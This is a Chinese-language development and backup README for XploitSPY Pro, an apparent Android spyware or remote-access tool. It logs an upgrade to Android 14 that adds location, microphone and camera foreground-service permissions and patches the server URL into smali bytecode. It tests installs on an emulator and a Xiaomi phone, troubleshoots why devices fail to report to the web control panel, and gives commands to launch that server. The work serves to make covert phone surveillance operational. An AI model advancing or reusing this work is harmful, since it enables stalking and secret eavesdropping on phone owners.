# XploitSPY Pro - Android 14 兼容性更新备份

**备份日期**: 2026年5月11日  
**备份仓库**: https://github.com/dg49888safe/XploitSPYpro20260511.git  
**原始仓库**: https://github.com/dg49888safe/XploitSPYpro20260510.git

---

## 更新目的

本次更新旨在将 XploitSPY 项目升级以兼容 **Android 14 (API 34)** 及更高版本安卓系统。

### 主要改进

1. **SDK 版本升级**
   - `compileSdk`: 34 (Android 14)
   - `targetSdk`: 34
   - `minSdk`: 21 (Android 5.0)
   - `buildToolsVersion`: 34.0.0

2. **Gradle 升级**
   - Gradle 版本: 8.4
   - Android Gradle Plugin: 8.2.0
   - Java 兼容性: VERSION_11

3. **依赖库更新**
   - Socket.IO 客户端: 2.1.1
   - AndroidX Core: 1.13.1
   - AppCompat: 1.7.0
   - OkHttp: 4.12.0

4. **权限适配 (Android 14)**
   - 添加前台服务类型声明
   - `FOREGROUND_SERVICE_LOCATION`
   - `FOREGROUND_SERVICE_MICROPHONE`
   - `FOREGROUND_SERVICE_CAMERA`
   - `FOREGROUND_SERVICE_DATA_SYNC`

5. **APK 构建方案**
   - 支持双构建系统：Gradle 和 ApkTool
   - 自动检测 Android SDK
   - 无 SDK 环境回退到 ApkTool

6. **稳定性修复**
   - 禁用 ProGuard 混淆（避免运行时崩溃）
   - 修复 Smali 字节码寄存器号问题
   - 改进 URL 修补正则表达式

---

## 当前状态 ⚠️

**设备上线问题**: 目前 APK 构建成功，但在安卓设备上运行时 **Web 端未能成功接收设备上线通知**。

### 已完成的测试

| 测试项 | 结果 |
|--------|------|
| APK 生成 | ✅ 成功 |
| 雷电模拟器安装 | ✅ 成功 |
| 小米手机安装 | ✅ 成功 |
| 设备权限申请 | ✅ 正常显示 |
| Web 端设备上线 | ❌ 未成功 |

### 问题排查方向

1. **Socket.IO 连接问题**
   - 检查服务器端口 8080 是否开放
   - 确认客户端 URL 修补正确 (`h.smali` 中应显示正确服务器地址)

2. **权限问题**
   - 通知使用权是否启用
   - 设备管理员权限是否启用
   - 后台运行权限是否允许

3. **网络连通性**
   - 测试 `curl http://your-server:8080`
   - 检查防火墙设置

---

## 文件变更记录

### 核心修改文件

- `client/app/build.gradle` - SDK 和依赖升级
- `client/gradle/wrapper/gradle-wrapper.properties` - Gradle 8.4
- `client/gradle.properties` - 移除过时 JVM 参数
- `server/includes/apkBuilder.js` - 双构建系统实现
- `server/includes/const.js` - 构建路径配置
- `server/includes/expressRoutes.js` - 统一 API 调用

### 新增文件

- `test-build.js` - 命令行构建测试
- `STABILITY_FIX.md` - 稳定性修复文档
- `BACKUP_README.md` - 本备份说明

---

## 快速开始

```bash
# 克隆备份仓库
git clone https://github.com/dg49888safe/XploitSPYpro20260511.git
cd XploitSPYpro20260511

# 安装依赖
cd server
npm install

# 启动服务
PORT=8080 node index.js
```

---

## 待解决问题

- [ ] 安卓设备成功上线 Web 端
- [ ] Socket.IO 连接稳定性测试
- [ ] 各品牌手机兼容性测试（小米、华为、OPPO、vivo）

---

**备注**: 此备份保留当前开发进度，便于后续问题排查和回滚。
